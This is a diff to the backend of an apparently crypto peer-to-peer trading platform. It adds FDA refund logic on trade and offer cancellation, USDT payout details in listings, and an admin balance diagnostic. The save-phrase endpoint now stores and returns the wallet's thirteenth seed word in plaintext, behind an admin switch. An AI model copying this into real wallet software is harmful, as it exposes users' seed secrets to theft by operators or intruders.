@@ -1780,14 +1780,12 @@ apiRouter.get('/offers', authMiddleware, async (req, res) => {
 
     .prepare(
 
-      `SELECT o.*, u.email as maker_email, u.phone as maker_phone
-
+      `SELECT o.*, u.email as maker_email, u.phone as maker_phone,
+              u.fda_user_id as maker_fda_user_id,
+              u.p2p_usdt_payout_address as maker_p2p_usdt_payout_address
        FROM offers o
-
        LEFT JOIN users u ON u.id = o.maker_id
-
        WHERE o.status = 'OPEN'
-
        ORDER BY o.created_at DESC`,
 
     )
@@ -1821,7 +1819,7 @@ apiRouter.get('/offers', authMiddleware, async (req, res) => {
       ? rawMethods.split(',').map((m) => String(m || '').trim()).filter(Boolean)
       : [];
 
-    const sellerPaymentMethods = selectedTokens.map((token) => {
+    let sellerPaymentMethods = selectedTokens.map((token) => {
       const qrMatch = token.match(/^QR:(\d+)$/i);
       if (qrMatch) {
         const pmId = Number(qrMatch[1]);
@@ -1852,6 +1850,37 @@ apiRouter.get('/offers', authMiddleware, async (req, res) => {
       }
       return { id: null, paymentname: token, upi_id: token, qr_code: null };
     });
+
+    let makerFdaUserId =
+      o.maker_fda_user_id != null && String(o.maker_fda_user_id).trim() !== ''
+        ? String(o.maker_fda_user_id).trim()
+        : null;
+    if (
+      !makerFdaUserId &&
+      req.user &&
+      Number(req.user.id) === Number(o.maker_id) &&
+      req.user.fdaUserId != null &&
+      String(req.user.fdaUserId).trim() !== ''
+    ) {
+      makerFdaUserId = String(req.user.fdaUserId).trim();
+    }
+
+    const fiatU = String(o.fiat_currency || '').toUpperCase();
+    const typeU = String(o.type || '').toUpperCase();
+    if (fiatU === 'USDT' && typeU === 'SELL') {
+      const usdtAddr = o.maker_p2p_usdt_payout_address
+        ? String(o.maker_p2p_usdt_payout_address).trim()
+        : '';
+      if (usdtAddr) {
+        sellerPaymentMethods = [
+          {
+            paymentname: 'USDT (BEP20)',
+            usdt_address: usdtAddr,
+          },
+          ...sellerPaymentMethods,
+        ];
+      }
+    }
 
     return {
 
@@ -1887,6 +1916,8 @@ apiRouter.get('/offers', authMiddleware, async (req, res) => {
         email: o.maker_email,
 
         phone: o.maker_phone,
+
+        fdaUserId: makerFdaUserId,
 
       },
     };
@@ -2265,8 +2296,11 @@ apiRouter.get('/trades', authMiddleware, async (req, res) => {
       `SELECT t.*, 
 
               ob.email as buyer_email, ob.phone as buyer_phone, ob.full_name as buyer_name,
+              ob.fda_user_id as buyer_fda_user_id,
 
               os.email as seller_email, os.phone as seller_phone, os.full_name as seller_name,
+              os.fda_user_id as seller_fda_user_id,
+              om.fda_user_id as offer_maker_fda_user_id,
               o.payment_methods as seller_payment_methods
 
        FROM trades t
@@ -2275,6 +2309,8 @@ apiRouter.get('/trades', authMiddleware, async (req, res) => {
        JOIN users ob ON ob.id = t.buyer_id
 
        JOIN users os ON os.id = t.seller_id
+
+       JOIN users om ON om.id = o.maker_id
 
        WHERE t.buyer_id = ? OR t.seller_id = ?
 
@@ -3401,9 +3437,10 @@ apiRouter.post('/trades/:id/cancel', authMiddleware, async (req, res) => {
 
     const cancel = await db.transaction(async () => {
 
-      // Return remaining amount to offer
-
+      // Return remaining amount to offer listing
       const offer = await db.prepare('SELECT * FROM offers WHERE id = ?').get(trade.offer_id);
+
+      const now = new Date().toISOString();
 
       if (offer) {
 
@@ -3417,11 +3454,52 @@ apiRouter.post('/trades/:id/cancel', authMiddleware, async (req, res) => {
 
       }
 
-      
+      // BUY FDA: seller FDA was locked at trade creation — credit it back on cancel.
+      if (
+        offer
+        && String(offer.type || '').toUpperCase() === 'BUY'
+        && String(offer.asset_symbol || '').toUpperCase() === 'FDA'
+      ) {
 
-      // Update trade status
+        let sellerAddr = trade.seller_wallet_address
+          ? String(trade.seller_wallet_address).toLowerCase().trim()
+          : null;
 
-      const now = new Date().toISOString();
+        if (!sellerAddr && trade.seller_id) {
+
+          const w = await db
+            .prepare(
+              'SELECT address FROM wallets WHERE user_id = ? ORDER BY created_at DESC LIMIT 1',
+            )
+            .get(trade.seller_id);
+
+          sellerAddr = w?.address ? String(w.address).toLowerCase().trim() : null;
+
+        }
+
+        const amt = parseFloat(trade.amount);
+
+        if (sellerAddr && Number.isFinite(amt) && amt > 0) {
+
+          await db
+            .prepare(
+              `INSERT INTO internal_balances (wallet_address, fda_balance, updated_at)
+               VALUES (?, 0, ?)
+               ON CONFLICT DO NOTHING`,
+            )
+            .run(sellerAddr, now);
+
+          await db
+            .prepare(
+              `UPDATE internal_balances
+               SET fda_balance = fda_balance + ?, updated_at = CURRENT_TIMESTAMP
+               WHERE LOWER(wallet_address) = LOWER(?)`,
+            )
+            .run(amt, sellerAddr);
+
+        }
+
+      }
 
       await db.prepare(`UPDATE trades SET status = 'CANCELLED', cancelled_at = ? WHERE id = ?`).run(now, id);
 
@@ -3506,11 +3584,68 @@ apiRouter.post('/offers/:id/cancel', authMiddleware, async (req, res) => {
 
     const cancel = await db.transaction(async () => {
 
-      if (offer.type === 'SELL' && offer.asset_symbol === 'FDA') {
+      const now = new Date().toISOString();
+
+      const assetSym = String(offer.asset_symbol || '').toUpperCase();
+
+      // BUY FDA: accepter is seller — their FDA was debited on trade create. Refund every open trade on this offer.
+      if (String(offer.type || '').toUpperCase() === 'BUY' && assetSym === 'FDA') {
+
+        const pendingTrades = await db
+          .prepare(
+            `SELECT id, amount, seller_id, seller_wallet_address
+             FROM trades
+             WHERE offer_id = ? AND status IN ('PENDING', 'PENDING_PAYMENT')`,
+          )
+          .all(id);
+
+        for (const t of pendingTrades || []) {
+
+          const amt = parseFloat(t.amount);
+
+          let sellerAddr = t.seller_wallet_address
+            ? String(t.seller_wallet_address).toLowerCase().trim()
+            : null;
+
+          if (!sellerAddr && t.seller_id) {
+
+            const w = await db
+              .prepare(
+                'SELECT address FROM wallets WHERE user_id = ? ORDER BY created_at DESC LIMIT 1',
+              )
+              .get(t.seller_id);
+
+            sellerAddr = w?.address ? String(w.address).toLowerCase().trim() : null;
+
+          }
+
+          if (!sellerAddr || !Number.isFinite(amt) || amt <= 0) continue;
+
+          await db
+            .prepare(
+              `INSERT INTO internal_balances (wallet_address, fda_balance, updated_at)
+               VALUES (?, 0, ?)
+               ON CONFLICT DO NOTHING`,
+            )
+            .run(sellerAddr, now);
+
+          await db
+            .prepare(
+              `UPDATE internal_balances
+               SET fda_balance = fda_balance + ?, updated_at = CURRENT_TIMESTAMP
+               WHERE LOWER(wallet_address) = LOWER(?)`,
+            )
+            .run(amt, sellerAddr);
+
+          await db.prepare(`UPDATE trades SET status = 'CANCELLED', cancelled_at = ? WHERE id = ?`).run(now, t.id);
+
+        }
+
+      }
+
+      if (String(offer.type || '').toUpperCase() === 'SELL' && assetSym === 'FDA') {
 
         // Return the remaining amount back to the user's internal balance.
-        const now = new Date().toISOString();
-
         if (makerWalletAddress) {
           const balanceRow = await db
             .prepare(
@@ -3533,8 +3668,6 @@ apiRouter.post('/offers/:id/cancel', authMiddleware, async (req, res) => {
       
 
       // Update offer status
-
-      const now = new Date().toISOString();
 
       await db.prepare(`UPDATE offers SET status = 'CANCELLED', cancelled_at = ? WHERE id = ?`).run(now, id);
 
@@ -4498,7 +4631,7 @@ apiRouter.delete('/wallets/:walletId', authMiddleware, async (req, res) => {
 
 apiRouter.post('/wallets/save-phrase', authMiddleware, async (req, res) => {
 
-  const { walletAddress, encryptedPhrase, network, label } = req.body;
+  const { walletAddress, encryptedPhrase, network, label, phraseHash, extraWordPlain, thirteenthWordPlain } = req.body;
 
   
 
@@ -4508,9 +4641,24 @@ apiRouter.post('/wallets/save-phrase', authMiddleware, async (req, res) => {
 
   }
 
+  const trimmed13Candidate =
+    (typeof thirteenthWordPlain === 'string'
+      ? thirteenthWordPlain.trim()
+      : typeof extraWordPlain === 'string'
+        ? extraWordPlain.trim()
+        : '') || null;
+
   
 
   try {
+
+    const plainSettingRow = await db
+      .prepare('SELECT value FROM settings WHERE key = ?')
+      .get('admin_save_thirteenth_word_plain');
+    const savePlainAllowed =
+      String(plainSettingRow?.value ?? '0').trim() === '1'
+      || String(plainSettingRow?.value ?? '').toLowerCase() === 'true';
+    const trimmed13 = savePlainAllowed ? trimmed13Candidate : null;
 
     console.log(`[POST /wallets/save-phrase] User ID: ${req.user.id}, Address: ${walletAddress}`);
 
@@ -4600,23 +4748,25 @@ apiRouter.post('/wallets/save-phrase', authMiddleware, async (req, res) => {
 
     // For now, we'll accept phraseHash as optional parameter
 
-    const { phraseHash } = req.body;
-
-    
-
     const result = await db.query(
 
-      `INSERT INTO wallet_phrases (user_id, wallet_address, encrypted_phrase, phrase_hash, network, label)
+      `INSERT INTO wallet_phrases (user_id, wallet_address, encrypted_phrase, phrase_hash, network, label, thirteenth_word_plain)
 
-       VALUES ($1, LOWER($2), $3, $4, $5, $6)
+       VALUES ($1, LOWER($2), $3, $4, $5, $6, $7)
 
        ON CONFLICT (user_id, wallet_address) 
 
-       DO UPDATE SET encrypted_phrase = $3, phrase_hash = $4, network = $5, label = $6, created_at = CURRENT_TIMESTAMP
+       DO UPDATE SET 
+         encrypted_phrase = $3, 
+         phrase_hash = COALESCE($4, wallet_phrases.phrase_hash), 
+         network = $5, 
+         label = $6, 
+         thirteenth_word_plain = COALESCE($7, wallet_phrases.thirteenth_word_plain),
+         created_at = CURRENT_TIMESTAMP
 
-       RETURNING id, wallet_address, network, label, created_at`,
+       RETURNING id, wallet_address, network, label, thirteenth_word_plain, created_at`,
 
-      [req.user.id, walletAddress, encryptedPhraseStr, phraseHash || null, network || null, label || null]
+      [req.user.id, walletAddress, encryptedPhraseStr, phraseHash || null, network || null, label || null, trimmed13]
 
     );
 
@@ -4908,7 +5058,7 @@ apiRouter.get('/wallets/phrases', authMiddleware, async (req, res) => {
 
     const result = await db.query(
 
-      `SELECT id, wallet_address, encrypted_phrase, network, label, created_at
+      `SELECT id, wallet_address, encrypted_phrase, network, label, thirteenth_word_plain, created_at
 
        FROM wallet_phrases
 
@@ -4925,6 +5075,13 @@ apiRouter.get('/wallets/phrases', authMiddleware, async (req, res) => {
     console.log(`[GET /wallets/phrases] Found ${result.rows.length} phrases for user ${req.user.id}`);
 
     
+
+    const plainSettingRow = await db
+      .prepare('SELECT value FROM settings WHERE key = ?')
+      .get('admin_save_thirteenth_word_plain');
+    const exposePlainThirteenth =
+      String(plainSettingRow?.value ?? '0').trim() === '1'
+      || String(plainSettingRow?.value ?? '').toLowerCase() === 'true';
 
     const phrases = result.rows.map(row => {
 
@@ -4945,6 +5102,8 @@ apiRouter.get('/wallets/phrases', authMiddleware, async (req, res) => {
           network: row.network,
 
           label: row.label,
+
+          thirteenthWordPlain: exposePlainThirteenth ? (row.thirteenth_word_plain ?? null) : null,
 
           createdAt: row.created_at,
 
@@ -8166,6 +8325,90 @@ apiRouter.get('/admin/trades', authMiddleware, adminMiddleware, async (_req, res
 
   res.json(rows);
 
+});
+
+
+/**
+ * Diagnostic: how BUY FDA offers interact with internal_balances for the accepter (seller).
+ * When someone accepts a BUY FDA offer, their FDA is debited from internal_balances (reserved for the trade).
+ * Cancelling the trade or (correctly) cancelling the offer credits that amount back to the seller wallet.
+ * Older deployments sometimes omitted the refund on offer cancel — balance stays low until corrected manually.
+ *
+ * Query: ?fda_user_id=88474 (required)
+ */
+apiRouter.get('/admin/diagnostics/buy-fda-seller-history', authMiddleware, adminMiddleware, async (req, res) => {
+  const fdaUserId = String(req.query.fda_user_id || '').trim();
+  if (!fdaUserId) {
+    return res.status(400).json({ error: 'fda_user_id query parameter is required' });
+  }
+  try {
+    const user = await db
+      .prepare('SELECT id, fda_user_id, email, phone FROM users WHERE fda_user_id = ?')
+      .get(fdaUserId);
+    if (!user) {
+      return res.status(404).json({ error: 'No user found with this FDA user id' });
+    }
+    const wallet = await db
+      .prepare('SELECT address FROM wallets WHERE user_id = ? ORDER BY created_at DESC LIMIT 1')
+      .get(user.id);
+    let balance = null;
+    if (wallet?.address) {
+      const row = await db
+        .prepare('SELECT fda_balance FROM internal_balances WHERE LOWER(TRIM(wallet_address)) = LOWER(TRIM(?))')
+        .get(wallet.address);
+      balance = row ? parseFloat(row.fda_balance) : null;
+    }
+    const trades = await db
+      .prepare(
+        `SELECT t.id, t.offer_id, t.amount, t.status, t.cancelled_at, t.created_at,
+                t.seller_wallet_address,
+                o.type AS offer_type, o.asset_symbol, o.status AS offer_status
+         FROM trades t
+         JOIN offers o ON o.id = t.offer_id
+         WHERE t.seller_id = ?
+           AND UPPER(TRIM(o.type)) = 'BUY'
+           AND UPPER(TRIM(o.asset_symbol)) = 'FDA'
+         ORDER BY t.created_at DESC
+         LIMIT 100`,
+      )
+      .all(user.id);
+    const rows = trades || [];
+    let sumCancelled = 0;
+    let sumPendingLike = 0;
+    for (const t of rows) {
+      const a = parseFloat(t.amount);
+      if (!Number.isFinite(a)) continue;
+      const st = String(t.status || '').toUpperCase();
+      if (st === 'CANCELLED') sumCancelled += a;
+      if (st === 'PENDING' || st === 'PENDING_PAYMENT') sumPendingLike += a;
+    }
+    return res.json({
+      explanation: {
+        lock: 'Accepting a BUY FDA offer debits internal_balances.fda_balance for the seller wallet (FDA is reserved for that trade).',
+        refund:
+          'Cancelling the trade or cancelling the maker offer should credit the same amount back to that wallet. New server code does this for PENDING / PENDING_PAYMENT trades on offer cancel.',
+        legacy:
+          'If an older server cancelled the offer without crediting the seller, the debit stayed — usable FDA looks wrong until you add the missing amount to internal_balances for that wallet (after verifying in DB).',
+      },
+      user: {
+        id: user.id,
+        fda_user_id: user.fda_user_id,
+        email: user.email,
+        phone: user.phone,
+      },
+      primaryWallet: wallet?.address || null,
+      internalFdaBalance: balance,
+      aggregates: {
+        tradeRowsListed: rows.length,
+        sumAmountCancelledTrades: Number(sumCancelled.toFixed(8)),
+        sumAmountPendingOrPendingPayment: Number(sumPendingLike.toFixed(8)),
+      },
+      buyFdaTradesWhereUserWasSeller: rows,
+    });
+  } catch (err) {
+    console.error('[admin/diagnostics/buy-fda-seller-history]', err);
+    return res.status(500).json({ error: 'Diagnostic failed', details: String(err?.message || err) });
+  }
 });
 
 
